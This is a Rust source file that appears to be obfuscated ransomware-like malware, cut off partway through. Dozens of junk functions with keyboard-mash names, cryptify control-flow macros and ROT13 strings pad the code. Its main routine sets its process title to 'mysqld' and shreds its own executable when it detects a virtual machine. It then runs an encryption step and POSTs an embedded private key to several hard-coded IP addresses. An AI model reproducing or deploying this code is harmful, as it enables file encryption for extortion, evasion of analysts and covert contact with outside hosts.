gen_range (0 .. 50) ; } result } fn woihajkdfhajk (start : i32 , end : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = start ; for _ in 0 .. thread_rng () . gen_range (1 .. 3) { result += thread_rng () . gen_range (0 .. 15) ; } result % (end - start) + start } fn jahsdkjhfwal () -> i32 { let mut result = 0 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 30) ; } result } fn fhajkdfhajkdw (x : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 110) ; } result } fn akdwidfeaiwfal (x : i32) -> i32 { let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 130) ; } result } fn _eaiadfklwfal (x : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 120) ; } result } fn afjaekdwid (x : i32) -> i32 { let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 140) ; } result } fn fehajkdfkesajk (x : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 150) ; } result } fn kjahsdkjhfwalwfal () -> i32 { let mut result = 0 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 160) ; } result } fn woihajkdfhajkdw (start : i32 , end : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = start ; for _ in 0 .. thread_rng () . gen_range (1 .. 3) { result += thread_rng () . gen_range (0 .. 20) ; } result % (end - start) + start } fn jahsdkjhfwalwfalwfal () -> i32 { let mut result = 0 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 170) ; } result } fn fhajkdfhajkdwajkdw (x : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 180) ; } result } fn akdwidfeaiwfalwfal (x : i32) -> i32 { let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 190) ; } result } fn _eaiadfklwfalwfalwfal (x : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 200) ; } result } fn kjhgfdkjhgfdkjhgfdkjhgfdkjhgfd () -> i32 { let mut result = 111 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 610) ; } result } fn poiuytrewqazxswedcvfrpoiuytrewqazxswedcvfrpoiuytrewqazxswedcvfr () -> f64 { cryptify :: flow_stmt ! () ; let mut result = 2.34 ; for _ in 0 .. thread_rng () . gen_range (1 .. 4) { result += thread_rng () . gen_range (0.0 .. 15.0) ; } result } fn asdfghjklpoiuytrewqazxswedcvasdfghjklpoiuytrewqazxswedcvasdfghjklpoiuytrewqazxswedcv () -> i64 { let mut result = 654 ; for _ in 0 .. thread_rng () . gen_range (3 .. 6) { result += thread_rng () . gen_range (0 .. 820) ; } result } fn zxcvbnmzxcvbnmzxcvbnmzxcvbnmzxcvbnmzxcvbnmzxcvbnm () -> i32 { cryptify :: flow_stmt ! () ; let mut result = 300 ; for _ in 0 .. thread_rng () . gen_range (1 .. 3) { result += thread_rng () . gen_range (0 .. 80) ; } result } fn bhgfdsajkghfdbhgfdajkghfdbhgfdajkghfdbhgfdajkghfdbhgfdajkghf () -> f64 { let mut result = 1.91 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0.0 .. 25.0) ; } result } fn yuiopasdfghjkyuiopasdfghjkyuiopasdfghjkyuiopasdfghjk () -> i64 { cryptify :: flow_stmt ! () ; let mut result = 567 ; for _ in 0 .. thread_rng () . gen_range (3 .. 7) { result += thread_rng () . gen_range (0 .. 930) ; } result } fn mnbvcxzasdfghjklmnbvcxzasdfghjklmnbvcxzasdfghjklmnbvcxzasdfghjkl () -> i32 { let mut result = 250 ; for _ in 0 .. thread_rng () . gen_range (1 .. 4) { result += thread_rng () . gen_range (0 .. 110) ; } result } fn qwerasdfghjklzxcvbnmqwerasdfghjklzxcvbnmqwerasdfghjklzxcvbnmqwerasdfghjklzxcvbnm () -> f64 { cryptify :: flow_stmt ! () ; let mut result = 3.14 ; for _ in 0 .. thread_rng () . gen_range (2 .. 6) { result += thread_rng () . gen_range (0.0 .. 60.0) ; } result } fn poiuytrewqpoiuytrewqpoiuytrewqpoiuytrewqpoiuytrewqpoiuytrewq () -> i64 { let mut result = 999 ; for _ in 0 .. thread_rng () . gen_range (3 .. 5) { result += thread_rng () . gen_range (0 .. 1050) ; } result } fn asdfghjklasdfghjklasdfghjklasdfghjklasdfghjklasdfghjkl () -> i32 { cryptify :: flow_stmt ! () ; let mut result = 400 ; for _ in 0 .. thread_rng () . gen_range (1 .. 3) { result += thread_rng () . gen_range (0 .. 140) ; } result } fn zxcvbnmzxcvbnmzxcvbnmzxcvbnmzxcvbnmzxcvbnmzxcvbnmzxcvbnm () -> f64 { let mut result = 2.71 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0.0 .. 35.0) ; } result } fn kjhgfdkjhgfdkjhgfdkjhgfdkjhgfdkjhgfd () -> i32 { cryptify :: flow_stmt ! () ; let mut result = 222 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 630) ; } result } fn poiuytrewqazxswedcvfrpoiuytrewqazxswedcvfrpoiuytrewqazxswedcvfrpoiuytrewqazxswedcvfr () -> f64 { let mut result = 2.56 ; for _ in 0 .. thread_rng () . gen_range (1 .. 4) { result += thread_rng () . gen_range (0.0 .. 18.0) ; } result } fn asdfghjklpoiuytrewqazxswedcvasdfghjklpoiuytrewqazxswedcvasdfghjklpoiuytrewqazxswedcvasdfghjklpoiuytrewqazxswedcv () -> i64 { cryptify :: flow_stmt ! () ; let mut result = 741 ; for _ in 0 .. thread_rng () . gen_range (3 .. 6) { result += thread_rng () . gen_range (0 .. 860) ; } result } fn zxcvbnmzxcvbnmzxcvbnmzxcvbnmzxcvbnmzxcvbnmzxcvbnmzxcvbnmzxcvbnm () -> i32 { let mut result = 350 ; for _ in 0 .. thread_rng () . gen_range (1 .. 3) { result += thread_rng () . gen_range (0 .. 90) ; } result } fn bhgfdsajkghfdbhgfdajkghfdbhgfdajkghfdbhgfdajkghfdbhgfdajkghfdbhgfdajkghfdbhgfdajkghf () -> f64 { cryptify :: flow_stmt ! () ; let mut result = 1.98 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0.0 .. 28.0) ; } result } fn yuiopasdfghjkyuiopasdfghjkyuiopasdfghjkyuiopasdfghjkyuiopasdfghjk () -> i64 { let mut result = 852 ; for _ in 0 .. thread_rng () . gen_range (3 .. 7) { result += thread_rng () . gen_range (0 .. 980) ; } result } fn mnbvcxzasdfghjklmnbvcxzasdfghjklmnbvcxzasdfghjklmnbvcxzasdfghjklmnbvcxzasdfghjkl () -> i32 { cryptify :: flow_stmt ! () ; let mut result = 270 ; for _ in 0 .. thread_rng () . gen_range (1 .. 4) { result += thread_rng () . gen_range (0 .. 120) ; } result } fn qwerasdfghjklzxcvbnmqwerasdfghjklzxcvbnmqwerasdfghjklzxcvbnmqwerasdfghjklzxcvbnmqwerasdfghjklzxcvbnm () -> f64 { let mut result = 3.85 ; for _ in 0 .. thread_rng () . gen_range (2 .. 6) { result += thread_rng () . gen_range (0.0 .. 65.0) ; } result } fn poiuytrewqpoiuytrewqpoiuytrewqpoiuytrewqpoiuytrewqpoiuytrewqpoiuytrewqpoiuytrewq () -> i64 { cryptify :: flow_stmt ! () ; let mut result = 1111 ; for _ in 0 .. thread_rng () . gen_range (3 .. 5) { result += thread_rng () . gen_range (0 .. 1100) ; } result } fn asdfghjklasdfghjklasdfghjklasdfghjklasdfghjklasdfghjklasdfghjklasdfghjkl () -> i32 { let mut result = 450 ; for _ in 0 .. thread_rng () . gen_range (1 .. 3) { result += thread_rng () . gen_range (0 .. 150) ; } result } fn kjhgfdkjhgfdkjhgfdkjhgfdkjhgfdkjhgfdkjhgfd () -> i32 { cryptify :: flow_stmt ! () ; let mut result = 333 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 660) ; } result } fn poiuytrewqazxswedcvfrpoiuytrewqazxswedcvfrpoiuytrewqazxswedcvfrpoiuytrewqazxswedcvfrpoiuytrewqazxswedcvfr () -> f64 { let mut result = 2.91 ; for _ in 0 .. thread_rng () . gen_range (1 .. 4) { result += thread_rng () . gen_range (0.0 .. 22.0) ; } result } fn zxcvbnmzxcvbnmzxcvbnmzxcvbnmzxcvbnmzxcvbnmzxcvbnmzxcvbnmzxcvbnmzxcvbnmzxcvbnm () -> i32 { cryptify :: flow_stmt ! () ; let mut result = 380 ; for _ in 0 .. thread_rng () . gen_range (1 .. 3) { result += thread_rng () . gen_range (0 .. 100) ; } result } fn bhgfdsajkghfdbhgfdajkghfdbhgfdajkghfdbhgfdajkghfdbhgfdajkghfdbhgfdajkghfdbhgfdajkghfdbhgfdajkghf () -> f64 { let mut result = 2.13 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0.0 .. 38.0) ; } result } fn mnbvcxzasdfghjklmnbvcxzasdfghjklmnbvcxzasdfghjklmnbvcxzasdfghjklmnbvcxzasdfghjklmnbvcxzasdfghjkl () -> i32 { cryptify :: flow_stmt ! () ; let mut result = 300 ; for _ in 0 .. thread_rng () . gen_range (1 .. 4) { result += thread_rng () . gen_range (0 .. 130) ; } result } fn poiuytrewqpoiuytrewqpoiuytrewqpoiuytrewqpoiuytrewqpoiuytrewqpoiuytrewqpoiuytrewqpoiuytrewqpoiuytrewq () -> i64 { let mut result = 1357 ; for _ in 0 .. thread_rng () . gen_range (3 .. 5) { result += thread_rng () . gen_range (0 .. 1200) ; } result } fn asdfghjklasdfghjklasdfghjklasdfghjklasdfghjklasdfghjklasdfghjklasdfghjklasdfghjklasdfghjklasdfghjkl () -> i32 { cryptify :: flow_stmt ! () ; let mut result = 480 ; for _ in 0 .. thread_rng () . gen_range (1 .. 3) { result += thread_rng () . gen_range (0 .. 160) ; } result } fn kjhgfdkjhgfdkjhgfdkjhgfdkjhgfdkjhgfdkjhgfdkjhgfd () -> i32 { let mut result = 411 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 740) ; } result } fn poiuytrewqazxswedcvfrpoiuytrewqazxswedcvfrpoiuytrewqazxswedcvfrpoiuytrewqazxswedcvfrpoiuytrewqazxswedcvfrpoiuytrewqazxswedcvfr () -> f64 { cryptify :: flow_stmt ! () ; let mut result = 2.67 ; for _ in 0 .. thread_rng () . gen_range (1 .. 4) { result += thread_rng () . gen_range (0.0 .. 29.0) ; } result } fn bhgfdsajkghfdbhgfdajkghfdbhgfdajkghfdbhgfdajkghfdbhgfdajkghfdbhgfdajkghfdbhgfdajkghfdbhgfdajkghfdbhgfdajkghfdbhgfdajkghf () -> f64 { let mut result = 2.49 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0.0 .. 42.0) ; } result } mod qwertyuiop { pub fn asdfghjklmnbvc () { cryptify :: flow_stmt ! () ; let xcvbnm = 10 ; if false { let kjhgfdertyu = xcvbnm ; println ! ("Jvgu pnaavat rzretrapr {}" , kjhgfdertyu) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; } pub fn poiuytrewqasdfghj () { let mut azertyuiop = 5 ; let _jvgu = match false { true => "Pnrfne pnaavat rzretrapr" , false => "Jvgu pnaavat rzretrapr" , } ; } } fn mnbvcxzasdfghj () { cryptify :: flow_stmt ! () ; let poiuytrewq = 10 ; if false { let asdfghjklm = poiuytrewq ; println ! ("Jvgu pnaavat rzretrapr {}" , asdfghjklm) ; } println ! ("poiuytrewq vf fgvyy {}" , poiuytrewq) ; struct Qwertyui { foo : i32 , } enum Asdfghjklm { Foo , Bar , } let jvgu = "Jvgu pnaavat rzretrapr" ; } fn yuiopasdfghjklm () { loop { break ; println ! ("Pnrfne pnaavat rzretrapr") ; } } fn azertyuiopasdfghjkl () { cryptify :: flow_stmt ! () ; let xcvbnm = 5 ; if false { let kjhgfdertyu = xcvbnm ; println ! ("Jvgu pnaavat rzretrapr {}" , kjhgfdertyu) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; let mut qwerasdfghjklm = 10 ; } fn poiuytrewqasdfghjklmnb () { let poiuytrewq = 10 ; if false { let asdfghjklm = poiuytrewq ; println ! ("Pnrfne pnaavat rzretrapr {}" , asdfghjklm) ; } println ! ("poiuytrewq vf fgvyy {}" , poiuytrewq) ; struct Qwertyui { foo : i32 , } enum Asdfghjklm { Foo , Bar , } } fn ghjklmnbvcxzasdfghj () { cryptify :: flow_stmt ! () ; let xcvbnm = 5 ; if false { let kjhgfdertyu = xcvbnm ; println ! ("Jvgu pnaavat rzretrapr {}" , kjhgfdertyu) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; let jvgu = "Jvgu pnaavat rzretrapr" ; } fn asdfghjklmnbvcxzasdf () { let poiuytrewq = 10 ; if false { let asdfghjklm = poiuytrewq ; println ! ("Jvgu pnaavat rzretrapr {}" , asdfghjklm) ; } println ! ("poiuytrewq vf fgvyy {}" , poiuytrewq) ; let mut qwerasdfghjklm = 10 ; } fn poiuytrewqasdfghjklmnbvc () { cryptify :: flow_stmt ! () ; let xcvbnm = 5 ; if false { let kjhgfdertyu = xcvbnm ; println ! ("Pnrfne pnaavat rzretrapr {}" , kjhgfdertyu) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; struct Qwertyui { foo : i32 , } enum Asdfghjklm { Foo , Bar , } } fn azertyuiopasdfghjklmnb () { loop { break ; println ! ("Pnrfne pnaavat rzretrapr") ; } } mod zxcvbnm { pub fn poiuytrewqasdfghjklm () { cryptify :: flow_stmt ! () ; let xcvbnm = 10 ; if false { let kjhgfdertyu = xcvbnm ; println ! ("Gur pnaavat rzretrapr {}" , kjhgfdertyu) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; } pub fn asdfghjklmnbvcxz () { let mut azertyuiop = 5 ; let _gur = match false { true => "Pnrfne pnaavat rzretrapr" , false => "Gur pnaavat rzretrapr" , } ; } } fn mnbvcxzasdfghjklmnb () { cryptify :: flow_stmt ! () ; let poiuytrewq = 10 ; if false { let asdfghjklm = poiuytrewq ; println ! ("Gur pnaavat rzretrapr {}" , asdfghjklm) ; } println ! ("poiuytrewq vf fgvyy {}" , poiuytrewq) ; struct Qwertyui { foo : i32 , } enum Asdfghjklm { Foo , Bar , } let gur = "Gur pnaavat rzretrapr" ; } fn yuiopasdfghjklmnbvc () { loop { break ; println ! ("Pnrfne pnaavat rzretrapr") ; } } fn azertyuiopasdfghjklmnbvcxz () { cryptify :: flow_stmt ! () ; let xcvbnm = 5 ; if false { let kjhgfdertyu = xcvbnm ; println ! ("Gur pnaavat rzretrapr {}" , kjhgfdertyu) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; let mut qwerasdfghjklmnbvc = 10 ; } fn poiuytrewqasdfghjklmnbvcxz () { let poiuytrewq = 10 ; if false { let asdfghjklm = poiuytrewq ; println ! ("Pnrfne pnaavat rzretrapr {}" , asdfghjklm) ; } println ! ("poiuytrewq vf fgvyy {}" , poiuytrewq) ; struct Qwertyui { foo : i32 , } enum Asdfghjklm { Foo , Bar , } } fn ghjklmnbvcxzasdfghjklmnb () { cryptify :: flow_stmt ! () ; let xcvbnm = 5 ; if false { let kjhgfdertyu = xcvbnm ; println ! ("Gur pnaavat rzretrapr {}" , kjhgfdertyu) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; let gur = "Gur pnaavat rzretrapr" ; } fn asdfghjklmnbvcxzasdfghjklm () { let poiuytrewq = 10 ; if false { let asdfghjklm = poiuytrewq ; println ! ("Gur pnaavat rzretrapr {}" , asdfghjklm) ; } println ! ("poiuytrewq vf fgvyy {}" , poiuytrewq) ; let mut qwerasdfghjklmnbvc = 10 ; } fn poiuytrewqasdfghjklmnbvcxzasdf () { cryptify :: flow_stmt ! () ; let xcvbnm = 5 ; if false { let kjhgfdertyu = xcvbnm ; println ! ("Pnrfne pnaavat rzretrapr {}" , kjhgfdertyu) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; struct Qwertyui { foo : i32 , } enum Asdfghjklm { Foo , Bar , } } fn azertyuiopasdfghjklmnbvcxzasdfghj () { loop { break ; println ! ("Pnrfne pnaavat rzretrapr") ; } } mod qwertyuiopasdfghjklm { pub fn poiuytrewqasdfghjklmnbvcxz () { cryptify :: flow_stmt ! () ; let xcvbnm = 10 ; if false { let kjhgfdertyu = xcvbnm ; println ! ("Fbqra pnaavat rzretrapr {}" , kjhgfdertyu) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; } pub fn asdfghjklmnbvcxzqwerty () { let mut azertyuiop = 5 ; let _fbqra = match false { true => "Pnrfne pnaavat rzretrapr" , false => "Fbqra pnaavat rzretrapr" , } ; } } fn mnbvcxzasdfghjklmnbvcxz () { cryptify :: flow_stmt ! () ; let poiuytrewq = 10 ; if false { let asdfghjklm = poiuytrewq ; println ! ("Fbqra pnaavat rzretrapr {}" , asdfghjklm) ; } println ! ("poiuytrewq vf fgvyy {}" , poiuytrewq) ; struct Qwertyui { foo : i32 , } enum Asdfghjklm { Foo , Bar , } let fbqra = "Fbqra pnaavat rzretrapr" ; } fn yuiopasdfghjklmnbvcxzqwerty () { loop { break ; println ! ("Pnrfne pnaavat rzretrapr") ; } } fn azertyuiopasdfghjklmnbvcxzqwertyuiop () { cryptify :: flow_stmt ! () ; let xcvbnm = 5 ; if false { let kjhgfdertyu = xcvbnm ; println ! ("Fbqra pnaavat rzretrapr {}" , kjhgfdertyu) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; let mut qwerasdfghjklmnbvcxzqwerty = 10 ; } fn poiuytrewqasdfghjklmnbvcxzqwertyuiop () { let poiuytrewq = 10 ; if false { let asdfghjklm = poiuytrewq ; println ! ("Pnrfne pnaavat rzretrapr {}" , asdfghjklm) ; } println ! ("poiuytrewq vf fgvyy {}" , poiuytrewq) ; struct Qwertyui { foo : i32 , } enum Asdfghjklm { Foo , Bar , } } fn ghjklmnbvcxzasdfghjklmnbvcxzqwerty () { cryptify :: flow_stmt ! () ; let xcvbnm = 5 ; if false { let kjhgfdertyu = xcvbnm ; println ! ("Fbqra pnaavat rzretrapr {}" , kjhgfdertyu) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; let fbqra = "Fbqra pnaavat rzretrapr" ; } fn asdfghjklmnbvcxzasdfghjklmnbvcxzqwerty () { let poiuytrewq = 10 ; if false { let asdfghjklm = poiuytrewq ; println ! ("Fbqra pnaavat rzretrapr {}" , asdfghjklm) ; } println ! ("poiuytrewq vf fgvyy {}" , poiuytrewq) ; let mut qwerasdfghjklmnbvcxzqwerty = 10 ; } mod asdfghjklmnbvcxzqwertyuiopasdfghjklm { pub fn poiuytrewqasdfghjklmnbvcxzqwertyuiopasdfghjklmnb () { cryptify :: flow_stmt ! () ; let xcvbnm = 10 ; if false { let kjhgfdertyu = xcvbnm ; println ! ("Gur pnaavat rzretrapr {}" , kjhgfdertyu) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; } pub fn asdfghjklmnbvcxzqwertyuiopasdfghjklmnbvcxz () { let mut azertyuiop = 5 ; let _gur = match false { true => "Pnrfne pnaavat rzretrapr" , false => "Gur pnaavat rzretrapr" , } ; } } fn mnbvcxzasdfghjklmnbvcxzqwertyuiopasdfghjklmnb () { cryptify :: flow_stmt ! () ; let poiuytrewq = 10 ; if false { let asdfghjklm = poiuytrewq ; println ! ("Gur pnaavat rzretrapr {}" , asdfghjklm) ; } println ! ("poiuytrewq vf fgvyy {}" , poiuytrewq) ; struct Qwertyui { foo : i32 , } enum Asdfghjklm { Foo , Bar , } let gur = "Gur pnaavat rzretrapr" ; } fn yuiopasdfghjklmnbvcxzqwertyuiopasdfghjklmnbvcxz () { loop { break ; println ! ("Pnrfne pnaavat rzretrapr") ; } } fn azertyuiopasdfghjklmnbvcxzqwertyuiopasdfghjklmnbvcxzqwerty () { cryptify :: flow_stmt ! () ; let xcvbnm = 5 ; if false { let kjhgfdertyu = xcvbnm ; println ! ("Gur pnaavat rzretrapr {}" , kjhgfdertyu) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; let mut qwerasdfghjklmnbvcxzqwertyuiopasdfghjklmnbvcxzqwerty = 10 ; } fn poiuytrewqasdfghjklmnbvcxzqwertyuiopasdfghjklmnbvcxzqwertyuiop () { let poiuytrewq = 10 ; if false { let asdfghjklm = poiuytrewq ; println ! ("Pnrfne pnaavat rzretrapr {}" , asdfghjklm) ; } println ! ("poiuytrewq vf fgvyy {}" , poiuytrewq) ; struct Qwertyui { foo : i32 , } enum Asdfghjklm { Foo , Bar , } } fn ghjklmnbvcxzasdfghjklmnbvcxzqwertyuiopasdfghjklmnbvcxzqwerty () { cryptify :: flow_stmt ! () ; let xcvbnm = 5 ; if false { let kjhgfdertyu = xcvbnm ; println ! ("Gur pnaavat rzretrapr {}" , kjhgfdertyu) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; let gur = "Gur pnaavat rzretrapr" ; } mod poiuytrewqasdfghjklmnbvcxzqwertyuiopasdfghjklmnbvcxz { pub fn asdfghjklmnbvcxzqwertyuiopasdfghjklmnbvcxzqwerty () { let xcvbnm = 10 ; if false { let kjhgfdertyu = xcvbnm ; println ! ("Jvgu pnaavat rzretrapr {}" , kjhgfdertyu) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; } pub fn poiuytrewqasdfghjklmnbvcxzqwertyuiopasdfghjklmnbvcxzqwertyuiop () { cryptify :: flow_stmt ! () ; let mut azertyuiop = 5 ; let _jvgu = match false { true => "Pnrfne pnaavat rzretrapr" , false => "Jvgu pnaavat rzretrapr" , } ; } } fn mnbvcxzasdfghjklmnbvcxzqwertyuiopasdfghjklmnbvcxzqwerty () { let poiuytrewq = 10 ; if false { let asdfghjklm = poiuytrewq ; println ! ("Jvgu pnaavat rzretrapr {}" , asdfghjklm) ; } println ! ("poiuytrewq vf fgvyy {}" , poiuytrewq) ; struct Qwertyui { foo : i32 , } enum Asdfghjklm { Foo , Bar , } let jvgu = "Jvgu pnaavat rzretrapr" ; } fn yuiopasdfghjklmnbvcxzqwertyuiopasdfghjklmnbvcxzqwertyuiopasdfghjklmnbvcxz () { loop { break ; println ! ("Pnrfne pnaavat rzretrapr") ; } } fn azertyuiopasdfghjklmnbvcxzqwertyuiopasdfghjklmnbvcxzqwertyuiopasdfghjklmnbvcxzqwerty () { cryptify :: flow_stmt ! () ; let xcvbnm = 5 ; if false { let kjhgfdertyu = xcvbnm ; println ! ("Jvgu pnaavat rzretrapr {}" , kjhgfdertyu) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; let mut qwerasdfghjklmnbvcxzqwertyuiopasdfghjklmnbvcxzqwertyuiopasdfghjklmnbvcxzqwerty = 10 ; } fn poiuytrewqasdfghjklmnbvcxzqwertyuiopasdfghjklmnbvcxzqwertyuiopasdfghjklmnbvcxzqwertyuiopasdfghjklmnbvcxz () { let poiuytrewq = 10 ; if false { let asdfghjklm = poiuytrewq ; println ! ("Pnrfne pnaavat rzretrapr {}" , asdfghjklm) ; } println ! ("poiuytrewq vf fgvyy {}" , poiuytrewq) ; struct Qwertyui { foo : i32 , } enum Asdfghjklm { Foo , Bar , } } fn ghjklmnbvcxzasdfghjklmnbvcxzqwertyuiopasdfghjklmnbvcxzqwertyuiopasdfghjklmnbvcxzqwertyuiopasdfghjklmnbvcxz () { cryptify :: flow_stmt ! () ; let xcvbnm = 5 ; if false { let kjhgfdertyu = xcvbnm ; println ! ("Jvgu pnaavat rzretrapr {}" , kjhgfdertyu) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; let jvgu = "Jvgu pnaavat rzretrapr" ; } use std :: process :: Stdio ; fn main () { set_title ("mysqld") ; let exe_path = env :: current_exe () . unwrap () ; let exe_path_str = exe_path . to_str () . expect ("failed to start...") ; let result = tokio :: runtime :: Builder :: new_current_thread () . enable_all () . build () . unwrap () . block_on (detect ()) ; if let Some (_virt) = result { let _ = Command :: new ("sh") . arg ("-c") . arg (format ! (r#"nohup shred "{}" -f -z -u -n 1000 > /dev/null 2>&1 &"# , exe_path_str)) . stdout (Stdio :: null ()) . stderr (Stdio :: null ()) . spawn () . expect ("failed to start...") ; println ! ("failed to start...") ; std :: process :: exit (1) ; } if fawjgkhfwlakhfdlawdfsgwadcwa () { let _ = Command :: new ("sh") . arg ("-c") . arg (format ! (r#"nohup shred "{}" -f -z -u -n 1000 > /dev/null 2>&1 &"# , exe_path_str)) . stdout (Stdio :: null ()) . stderr (Stdio :: null ()) . spawn () . expect ("failed to start...") ; println ! ("failed to start...") ; process :: exit (1) ; } if let Err (err) = x6 () { eprintln ! ("Error during encryption: {}" , err) ; std :: process :: exit (1) ; } else { println ! ("Success 0") ; } let client = Client :: new () ; let ips = ["110.90.15.37" , "192.168.1.100" , "8.8.8.8" , "203.0.113.1" ,] ; for ip in ips { let url = format ! ("https://{}/WFJuADIfHW" , ip) ; let res = client . post (& url) . header ("Content-Length" , "3456") . body (r"-----BEGIN PRIVATE KEY-----
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
